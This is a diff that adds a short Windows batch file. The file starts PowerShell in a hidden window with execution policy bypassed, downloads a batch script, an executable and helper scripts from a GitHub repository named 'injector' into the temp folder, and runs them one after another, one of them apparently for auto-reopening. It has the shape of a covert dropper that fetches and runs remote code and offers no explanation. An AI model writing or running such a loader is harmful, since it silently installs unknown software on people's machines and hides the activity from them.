@@ -1,0 +1,11 @@
+@echo off
+powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
+"(Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector/main/inh.bat' -OutFile \"$env:TEMP\inh.bat\"); ^
+ (Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector/main/inh.exe' -OutFile \"$env:TEMP\inh.exe\"); ^
+ (Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector/main/autoreopen.bat' -OutFile \"$env:TEMP\autoreopen.bat\"); ^
+ (Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector/main/deltasks.bat' -OutFile \"$env:TEMP\deltasks.bat\"); ^
+ Start-Process \"$env:TEMP\inh.bat\" -Wait; ^
+ Start-Process \"$env:TEMP\inh.exe\" -Wait; ^
+ Start-Process \"$env:TEMP\autoreopen.bat\" -Wait"
+
+exit
